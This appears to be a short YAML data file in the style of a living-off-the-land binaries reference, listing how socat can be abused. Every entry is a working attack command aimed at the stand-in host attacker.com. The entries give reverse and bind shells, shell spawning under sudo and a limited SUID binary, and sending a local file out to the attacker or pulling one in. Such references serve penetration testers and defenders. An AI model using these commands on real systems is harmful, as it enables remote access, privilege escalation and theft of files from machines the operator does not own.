---
functions:
  reverse-shell:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
  bind-shell:
    - description: Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.
      code: |
        LPORT=12345
        socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane
  sudo:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        sudo -E socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
  limited-suid:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        ./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
  file-upload:
    - description: Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
  file-download:
    - description: Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_save
        socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
---
